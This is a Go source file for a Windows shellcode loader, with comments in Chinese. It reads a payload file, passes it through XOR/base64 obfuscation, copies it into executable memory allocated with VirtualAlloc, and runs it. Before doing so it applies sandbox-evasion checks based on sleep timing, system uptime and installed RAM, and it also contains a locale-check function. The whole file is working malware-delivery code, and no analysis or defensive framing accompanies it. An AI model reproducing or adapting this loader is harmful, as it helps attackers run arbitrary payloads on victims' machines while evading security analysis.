package main

import (
	"encoding/base64"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"syscall"
	"time"
	"unsafe"
)

func IFlanguage() {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME) //获取当前系统首选语言
	if a[0] != "zh-CN" {
		os.Exit(1)
	}
}

func See_through() {
	// 1. 延时运行
	timeSleep1, _ := timeSleep()
	// 2. 检测开机时间
	bootTime1, _ := bootTime()
	// 3. 检测物理内存
	physicalMemory1, _ := physicalMemory()

	level := timeSleep1 + bootTime1 + physicalMemory1
	//fmt.Println("level:", level)
	if level < 2 {
		//fmt.Println("可能是沙箱！")
		os.Exit(1)
	}
}

// 1. 延时运行
func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(10 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(10*time.Second) {
		//fmt.Println("睡眠时间为:", sleepTime)
		return 1, nil
	} else {
		return 0, nil
	}
}

// 2. 检测开机时间
// 许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。
func bootTime() (int, error) {
	var kernel = syscall.NewLazyDLL("Kernel32.dll")
	GetTickCount := kernel.NewProc("GetTickCount")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return 0, nil
	}
	ms := time.Duration(r * 1000 * 1000)
	//fmt.Println("开机时常为:", ms)
	tm := time.Duration(30 * time.Minute)
	if ms < tm {
		return 0, nil
	} else {
		return 1, nil
	}

}

func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	if mem < 4 {
		//fmt.Printf("物理内存为%dG\n", mem)
		return 0, nil // 小于4GB返回0
	}
	return 1, nil // 大于4GB返回1
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var XorKey = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}

func Dencode(src string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(src)
	xor := []byte(data1)
	var shellcode []byte
	for i := 0; i < len(xor); i++ {
		shellcode = append(shellcode, xor[i]^XorKey[1]^XorKey[2])
	}
	return shellcode
}

func Encode(src string) string {
	shellcode := []byte(src)
	var xor_shellcode []byte
	for i := 0; i < len(shellcode); i++ {
		xor_shellcode = append(xor_shellcode, shellcode[i]^XorKey[2]^XorKey[1])
	}
	bdata := base64.StdEncoding.EncodeToString(xor_shellcode)

	return bdata
}

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func exec(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkError(err)
	}
	time.Sleep(5)

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkError(err)

	time.Sleep(5)
	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func read(file string) []byte {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Print(err)
	}
	return data
}

func main() {
	See_through()
	Encode := Encode(string(read("./payload.bin")))
	shellCodeHex := Dencode(Encode)
	exec(shellCodeHex)
}
